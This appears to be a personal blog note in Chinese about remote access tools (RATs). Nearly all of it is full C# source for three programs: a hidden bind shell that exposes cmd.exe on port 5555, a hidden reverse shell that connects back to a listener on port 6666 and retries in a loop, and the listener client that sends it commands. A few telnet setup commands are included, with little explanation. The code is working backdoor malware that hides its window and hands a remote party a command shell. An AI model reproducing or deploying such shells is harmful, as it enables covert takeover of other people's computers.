---
title: RAT 筆記
date: 2026-01-05 18:32:08
tags:
---
&nbsp;
<!-- more -->

### RAT (Remote Access Tool)
找 port 是否正確開啟
```
netstat -nan
```

開啟 telnet
```
gsudo Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient
```

telnet 用法
```
telnet localhost 4444
```

```
//
// Portbinding Shell - Encoding fixed for .NET Framework 4.7
//
using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace Hello
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        // 統一使用 CP950
        readonly Encoding enc = Encoding.GetEncoding(950);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 5555);
            tcpListener.Start();

            for (;;)
                RunServer();
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();

            networkStream = new NetworkStream(socketForClient);

            // Socket Stream 指定 CP950
            streamReader = new StreamReader(networkStream, enc);
            streamWriter = new StreamWriter(networkStream, enc);
            streamWriter.AutoFlush = true;

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardError = true;

            // cmd.exe 輸出編碼
            processCmd.StartInfo.StandardOutputEncoding = enc;
            processCmd.StartInfo.StandardErrorEncoding  = enc;

            processCmd.OutputDataReceived += CmdOutputDataHandler;

            processCmd.Start();
            processCmd.BeginOutputReadLine();

            // 關鍵：設定 cmd code page
            processCmd.StandardInput.WriteLine("chcp 950");

            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    string line = streamReader.ReadLine();
                    if (line == null)
                        break;

                    strInput.AppendLine(line);

                    // 一定要 ToString()
                    processCmd.StandardInput.WriteLine(strInput.ToString());

                    if (strInput.ToString().IndexOf("exit", StringComparison.OrdinalIgnoreCase) >= 0)
                        throw new ArgumentException();

                    strInput.Clear();
                }
                catch
                {
                    Cleanup();
                    break;
                }
            }
        }

        private void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                try
                {
                    streamWriter.WriteLine(e.Data);
                }
                catch { }
            }
        }

        private void Cleanup()
        {
            try { processCmd?.Kill(); } catch { }
            try { streamReader?.Close(); } catch { }
            try { streamWriter?.Close(); } catch { }
            try { networkStream?.Close(); } catch { }
            try { socketForClient?.Close(); } catch { }
        }
    }
}

```


### Reverse Shell

Server
```
//
// Reverse Portbinding Shell Server - by Paul Chin
// crackinglessons.com, crackinglesson.com
//
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO; //for Streams
using System.Diagnostics; //for Process

namespace Hello
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); //Wait 5 seconds then try again
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch(Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }//--end of while loop
        }//--end of RunServer()

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}

```


Client
```
//
//Reverse Connection Client Listener by Paul Chin
//crackinglessons.com, crackinglesson.com
// v2 - suppresses the ding sound when keydown is pressed in the textbox2
//
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO; //for Streams
using System.Threading; //to run commands concurrently
using System.Net; //for IPEndPoint

namespace HelloClient
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        Thread th_StartListen, th_RunClient;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();
            textBox2.Focus();
        }

        private void StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 6666);
            tcpListener.Start();
            toolStripStatusLabel1.Text = "Listening on port 6666 ...";
            for (; ; )
            {
                socketForServer = tcpListener.AcceptSocket();
                IPEndPoint ipend = (IPEndPoint)socketForServer.RemoteEndPoint;
                toolStripStatusLabel1.Text = "Connection from " + IPAddress.Parse(ipend.Address.ToString());
                th_RunClient = new Thread(new ThreadStart(RunClient));
                th_RunClient.Start();
            }
        }

        private void RunClient()
        {
            networkStream = new NetworkStream(socketForServer);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);
            }
        }

        private void Cleanup()
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socketForServer.Close();
            }
            catch (Exception err) { }
            toolStripStatusLabel1.Text = "Connection Lost";
        }

        private delegate void DisplayDelegate(string message);
        private void DisplayMessage(string message)
        {
            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                textBox1.AppendText(message);
            }
        }
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    //-- (optional) suppresses ding sound
                    e.SuppressKeyPress = true;

                    strInput.Append(textBox2.Text.ToString());
                    streamWriter.WriteLine(strInput);
                    streamWriter.Flush();
                    strInput.Remove(0, strInput.Length);
                    if (textBox2.Text == "exit") Cleanup();
                    if (textBox2.Text == "terminate") Cleanup();
                    if (textBox2.Text == "cls") textBox1.Text = "";
                    textBox2.Text = "";
                }
            }
            catch (Exception err) { }
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }
    }
}


```
